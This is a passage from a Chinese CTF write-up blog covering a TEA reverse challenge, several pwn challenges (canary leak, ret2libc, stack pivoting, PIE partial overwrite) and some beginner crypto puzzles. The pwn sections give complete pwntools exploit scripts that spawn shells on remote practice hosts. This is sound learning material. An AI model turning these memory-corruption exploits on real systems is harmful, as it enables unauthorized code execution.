<p>然后copy下标准的tea解密函数，Fr. <a href="https://zh.wikipedia.org/wiki/%E5%BE%AE%E5%9E%8B%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95">https://zh.wikipedia.org/wiki/微型加密算法</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span> <span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0xC6EF3720</span>, i;  <span class="comment">/* set up */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;                         <span class="comment">/* basic cycle start */</span></span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        sum -= delta;                                   </span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终完整的exp</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span> <span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, i;           <span class="comment">/* set up */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;                       <span class="comment">/* basic cycle start */</span></span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 += ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        v1 += ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);  </span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span> <span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0xC6EF3720</span>, i;  <span class="comment">/* set up */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;                         <span class="comment">/* basic cycle start */</span></span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        sum -= delta;                                   </span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> en[<span class="number">10</span>] = &#123;</span><br><span class="line">        <span class="number">0x28974004</span>, <span class="number">0xAAD86C7C</span>, <span class="number">0x8D085185</span>, <span class="number">0xD4399568</span>, <span class="number">0xA1BBCC5E</span>, <span class="number">0x645DC758</span>, <span class="number">0xD18027A9</span>, <span class="number">0x12A59394</span>, </span><br><span class="line">        <span class="number">0xEE77B33C</span>, <span class="number">0x22B51132</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> k[<span class="number">4</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">        decrypt(en + i, k);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(en);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211130145646730.png" alt="image-20211130145646730"></p>
<p>暴露出的编码和C语言数据存储的问题，操作系统那本还是要好好嚼</p>
<h2 id="pwn-canary"><a href="#pwn-canary" class="headerlink" title="pwn-canary"></a>pwn-canary</h2><p>符合canary类型中最为简单的一种：泄漏栈中的canary</p>
<p>主要有个细节，视频里没有提到，这里我们已经泄露canary</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211129202619225.png" alt="image-20211129202619225"></p>
<p>那么payload就是填充24个字节的垃圾数组，然后加上canary，再将返回地址（0x401280）覆盖成后门函数的地址</p>
<p>通过栈也可以清楚看到，总共填充（包括canary）0x20长数据，再加上0x8的寄存器？最后是<code>backdoor</code>的地址，一开始做的时候0x8字节忘了，导致始终不成功</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211129204224438.png" alt="image-20211129204224438"></p>
<p>最终的exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">28788</span>)</span><br><span class="line"><span class="comment"># sh = process(&quot;./canary&quot;)</span></span><br><span class="line"></span><br><span class="line">back_addr = <span class="number">0x401196</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak canary</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">16</span> + <span class="string">b&quot;B&quot;</span> * <span class="number">8</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">b&quot;B&quot;</span> * <span class="number">8</span>)</span><br><span class="line">canary = u64(sh.recv(<span class="number">8</span>))- <span class="number">0xa</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary ====&gt; &quot;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">24</span> + p64(canary) + <span class="string">b&quot;A&quot;</span> * <span class="number">8</span> + p64(back_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211129210508492.png" alt="image-20211129210508492"></p>
<h2 id="pwn-ret2libc"><a href="#pwn-ret2libc" class="headerlink" title="pwn-ret2libc"></a>pwn-ret2libc</h2><p>网上有道原题很像，但是打本地的，卡了好久，后来谢师傅和尚师傅嘲笑我远程要用<code>LicSearcher</code>找偏移</p>
<p>然后还有一个坑：这里u64要输入8字节长的，输出的省略了前面的<code>\x00</code>，要自己填充</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># read_addr = u64(p.recv(6)+&#x27;\x00&#x27;*2)</span></span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>然后这道题要对齐下栈，不然打不通，参考<a href="https://gmabru.yuque.com/iw46u7/zt2b1i/wa0rp2">https://gmabru.yuque.com/iw46u7/zt2b1i/wa0rp2</a></p>
<p>完整的exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./ret2libc&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26708</span>)</span><br><span class="line">e = ELF(<span class="string">&quot;./ret2libc&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt_addr = e.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">read_got_addr = e.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi_addr = <span class="number">0x401253</span></span><br><span class="line"></span><br><span class="line">padding = <span class="number">24</span></span><br><span class="line"></span><br><span class="line">payload1 = padding * <span class="string">b&quot;A&quot;</span> + p64(pop_rdi_addr) + p64(read_got_addr) + p64(puts_plt_addr) + p64(<span class="number">0x401176</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input: \n&quot;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">read_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;read&quot;</span>, read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">payload2 = padding * <span class="string">b&quot;A&quot;</span> + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(<span class="number">0x401019</span>) + p64(system_addr)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input: \n&quot;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><code>LibcSearcher</code>只支持python2（现在有python3的了<br>Fr.<a href="https://blog.csdn.net/MDong1344/article/details/120277351">https://blog.csdn.net/MDong1344/article/details/120277351</a></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211129210542869.png" alt="image-20211129210542869"></p>
<h2 id="pwn-pivoting"><a href="#pwn-pivoting" class="headerlink" title="pwn-pivoting"></a>pwn-pivoting</h2><p><strong>考点</strong>：栈迁移（和<a href="https://blog.csdn.net/qq_43409582/article/details/109991230">这道题</a>很像</p>
<p>照例checksec</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211201105446287.png" alt="image-20211201105446287"></p>
<p>提供了bss段，攻击思路就是在其上构造puts函数，再在溢出的时候将栈迁移到该bss处，完成类似ret2libc的操作，算基础的了</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211201130553884.png" alt="image-20211201130553884"></p>
<p>libc有多个版本，这里选能让打印出来的<strong>libc_base后3位为0的</strong>，才是正确的libc版本</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211201194612148.png" alt="image-20211201194612148"></p>
<p>到泄漏libc基址并重新回到main函数开始运行，这个没有问题；但是最后get shell直接调用<code>system(&quot;/bin/sh&quot;)</code>似乎不行，谢师傅说要用<code>one_dadget</code>（但是题目没有提供libc文件，所以就去BUU的FAQ这里把libc2.23的给下下来</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211201182552178.png" alt="image-20211201182552178"></p>
<p>可以看到有下面这些，我选了最后一个，但是似乎不能草率（后来知道栈题就是试</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211201194921923.png" alt="image-20211201194921923"></p>
<p>最终的exp没有成功</p>
<p>未完待续。。。应该从one_gadget学起下次（bushi）</p>
<hr>
<p>在谢师傅的指导下做出来了，失败的原因是，对栈迁移的理解有着本质的错误，还有对<code>leave</code>，<code>ret</code>还不是很会</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pivoting&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">28638</span>)</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&quot;./pivoting&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt_addr = e.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got_addr = e.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">read_got_addr = e.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x4011BA</span></span><br><span class="line">bss_addr = <span class="number">0x4040A0</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x401263</span></span><br><span class="line">leave_ret_addr = <span class="number">0x4011fd</span></span><br><span class="line">ret_addr = <span class="number">0x401019</span></span><br><span class="line"></span><br><span class="line">payload1 =p64(ret_addr)*<span class="number">20</span>+ p64(pop_rdi_addr) + p64(read_got_addr) + p64(puts_plt_addr) + p64(main_addr)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Input1: \n&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="number">16</span> * <span class="string">b&quot;A&quot;</span> + p64(bss_addr) + p64(leave_ret_addr)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Input2: \n&quot;</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;../libc-2.23.so&#x27;)</span></span><br><span class="line">puts_addr = u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_addr ====&gt;&quot;</span>, <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="comment"># system_addr = libc_base + libc.sym[&quot;system&quot;]</span></span><br><span class="line"><span class="comment"># bin_sh_addr = libc_base + libc.sym[&quot;/bin/sh&quot;]</span></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;read&quot;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base ====&gt;&quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil(b&quot;Input1: \n&quot;)</span></span><br><span class="line">payload1 =p64(ret_addr)*<span class="number">20</span>+ p64(libc_base+<span class="number">0xf1147</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line"><span class="comment">#p.recvuntil(b&quot;Input2: \n&quot;)</span></span><br><span class="line">payload3 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">16</span> + p64(bss_addr) + p64(leave_ret_addr)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>？？？本来可以的？现在为何又不行了？</p>
<p>此外，多选择的libc小版本，用<code>puts</code>获得的基址可能不准确，换比如<code>read</code>函数</p>
<p>因为栈迁移可以会运行两次main函数，再次调用setbuf可能会导致一些意想不到的结果</p>
<h2 id="pwn-pie"><a href="#pwn-pie" class="headerlink" title="pwn-pie"></a>pwn-pie</h2><p>能做出，但有问题，后来谢师傅解答了，关于平衡栈的，放在pwnTree里啦</p>
<hr>
<p>题目说了pie</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211130154839050.png" alt="image-20211130154839050"></p>
<p>显然我们要将这个覆盖为后门函数的地址</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211201012919386.png" alt="image-20211201012919386"></p>
<p>由于PIE的缺陷，后面的1.5个字节是不变的，只要爆破<code>11C0</code>的前一个1就好</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211201014535765.png" alt="image-20211201014535765"></p>
<p>payload后两个字节不变，瞎碰服务器上此次运行的程序的<code>backdoor</code>函数的倒数第四位，如果是<code>1</code>则可以交互的时候可以获得shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># p = process(&quot;./pie&quot;)</span></span><br><span class="line">        p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29495</span>)</span><br><span class="line">        p.recvline()</span><br><span class="line">        <span class="comment"># 本地打不通，因为libc2.27的system(&#x27;/bin/sh&#x27;)有栈不对齐，不用push rbp，所以跳转11C1</span></span><br><span class="line">        payload = <span class="number">24</span> * <span class="string">b&quot;a&quot;</span> + <span class="string">b&quot;\xC1\x11&quot;</span></span><br><span class="line">        <span class="comment"># payload = 24 * &quot;a&quot; + p16(0x11C1)			python2</span></span><br><span class="line">        p.send(payload)</span><br><span class="line">        p.interactive()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211201015425192.png" alt="image-20211201015425192"></p>
<p>emmmmm手动交互就难受，我恨，这tm是？射，所以payload不变就是$\frac{1}{16}$，像是很多人按照<code>0~f</code>爆破payload，就$\frac{1}{256}$，这里只会手交就寄了</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/%E5%8F%8C%E5%B0%84.svg" alt="双射"></p>
<hr>
<p>以下是菜鸡出题人py的一天，太菜了，全部出自别的比赛的签到题</p>
<h2 id="crypto-signin"><a href="#crypto-signin" class="headerlink" title="crypto-signin"></a>crypto-signin</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dHpvdXs1MXIydDc5MS1xcDJzLTQ0MDAtODk4My0ydDA3OTEycjI5cDd9</span><br></pre></td></tr></table></figure>

<p>base64$\rightarrow$caesar</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;51d2f791-cb2e-4400-8983-2f07912d29b7&#125;</span><br></pre></td></tr></table></figure>

<h2 id="crypto-baby-stream"><a href="#crypto-baby-stream" class="headerlink" title="crypto-baby_stream"></a>crypto-baby_stream</h2><p>来自RARCTF的签到题，主要考流密码，原题的代码很python，这里就直接展开并稍作修改</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x ** <span class="number">3</span> + x + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">g = []</span><br><span class="line">nonce = <span class="built_in">id</span>(gen)</span><br><span class="line"><span class="keyword">for</span> _i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    g.append(gen(nonce) % <span class="number">307</span>)</span><br><span class="line">    nonce += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    plain = fp.read()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">ord</span>(plain[i]) ^ g[i], end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="comment"># 28 127 115 26 92 122 217 187 67 287 92 94 139 139 62 73 311 85 6 218 120 19 304 65 216 167 162 20 147 274 35 88 76 66 0 46 5 22 45 19 113 255</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面的代码可以抽象成下面这个流密码生成器（平方改成立方，其实是原题WP里的图，懒得改了</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/minigen.png"></p>
<p>每次生成的<code>nonce</code>是随机的，我们不难看出当最开始的那个<code>nonce</code>固定下来，后面两两之间的差值有一定规律</p>
<p>因为当我们前后相减<br>$$<br>(x+1)^3+(x+1)+1-x^3-x-1=3x^2+3x+2<br>$$<br>发现两两之间的差值与最初始的状态有关，而这个初始状态在模运算下完全可以爆破</p>
<p>再用下已知的flag头方便理解（其实再生成一下g就好了</p>
<p>最终的exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">cipher = <span class="string">&#x27;28 127 115 26 92 122 217 187 67 287 92 94 139 139 62 73 311 85 6 218 120 19 304 65 216 167 162 20 147 274 35 88 76 66 0 46 5 22 45 19 113 255&#x27;</span></span><br><span class="line">cipher = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, cipher.split(<span class="string">&#x27; &#x27;</span>)))</span><br><span class="line">plain = <span class="string">&#x27;flag&#123;&#x27;</span></span><br><span class="line">f = <span class="built_in">ord</span>(plain[<span class="number">0</span>]) ^ cipher[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">307</span>):</span><br><span class="line">    s = f</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    flag = <span class="string">&#x27;f&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> cipher[<span class="number">1</span>:]:</span><br><span class="line">        s = (s + <span class="number">3</span> * (x + i) ** <span class="number">2</span> + <span class="number">3</span> * (x + i) + <span class="number">2</span>) % <span class="number">307</span></span><br><span class="line">        flag += <span class="built_in">chr</span>(s % <span class="number">307</span> ^ j)</span><br><span class="line">        x += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> flag.startswith(<span class="string">&#x27;flag&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;30aa24a3-1e4a-4e79-ad22-9c154fa22164&#125;</span><br></pre></td></tr></table></figure>

<h2 id="baby-nc"><a href="#baby-nc" class="headerlink" title="baby_nc"></a>baby_nc</h2><blockquote>
<p>nc 47.96.253.167 10001</p>
</blockquote>
<p>（寄，我是不是忘了删源码了</p>
<p>一比一还原TCTF的签到题，主要是知道下<code>netcat</code>、<code>gmpy2</code>或者<code>sage</code>的用法，C巨犇也可以用C实现下分治算法</p>
<p>没有源码，用linux的工具<code>nc</code>连上后有提示（可能有点慢，但怎么的用C写也起码要3秒吧</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211115143735337.png" alt="image-20211115143735337"></p>
<p>也就是要计算$2^{2^{9797869}} mod\ n$的结果，其中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">91199296749700640866861970843221921564137544261129053887425392932988391945347109139916771807692421337876348836994210858876263910655470768762350727999480618878134421267998392984933961329385719026483517450921019470754415144029155942372395138271661480657908744441177122383316627111414388193786640150788888530603</span></span><br></pre></td></tr></table></figure>

<p>只有10秒，且每次连接生成的指数和模数是不一样的</p>
<p>直接用python是出不来滴，但用<code>gmpy2</code>大数库的<code>powmod</code>只要3秒，用<code>sage</code>也很快（可能是优化过</p>
<p>最后exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh = remote(<span class="string">&#x27;47.96.253.167&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_param</span>():</span></span><br><span class="line">    <span class="comment"># Show me the answer:</span></span><br><span class="line">    <span class="comment"># 2^(2^15564589) mod 121681006663891030353125079362654646150164550749728886750112000021783884995766049892447002069598160684689219206863221050719168669576003627002300521823506368946026163175585544560064152737971271228176382282388743375550175972802243965592596093473434521220152129320759007520132577637100332218758770863084824561257</span></span><br><span class="line">    <span class="comment"># You have 10 seconds. gogogo!</span></span><br><span class="line">    <span class="comment"># Your answer:</span></span><br><span class="line">    _param = sh.recvuntil(<span class="string">b&#x27;Your answer: &#x27;</span>).decode()</span><br><span class="line">    a, b, p, n, _ = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, re.findall(<span class="string">r&quot;\d+&quot;</span>, _param)))</span><br><span class="line">    <span class="keyword">return</span> gmpy2.powmod(a, <span class="number">2</span> ** p, n)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>():</span></span><br><span class="line">    ans = solve_param()</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(ans).encode())</span><br><span class="line">    sh.recvline()</span><br><span class="line">    flag = sh.recvline()</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">solve()</span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211115144942991.png" alt="image-20211115144942991"></p>
<p>（md，python3.9怎么就出不来了</p>
<p>或者在sage里，只要把上面solve_param的返回写成</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="built_in">pow</span>(a, <span class="number">2</span> ** p, n)</span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211115153106512.png" alt="image-20211115153106512"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;88ad7950-91ab-4770-85f1-df7a0bb53a96&#125;</span><br></pre></td></tr></table></figure>

<p>也可以用C的<code>gmp</code>来写，<code>gmpy2</code>和<code>sage</code>可能就是基于这个的</p>
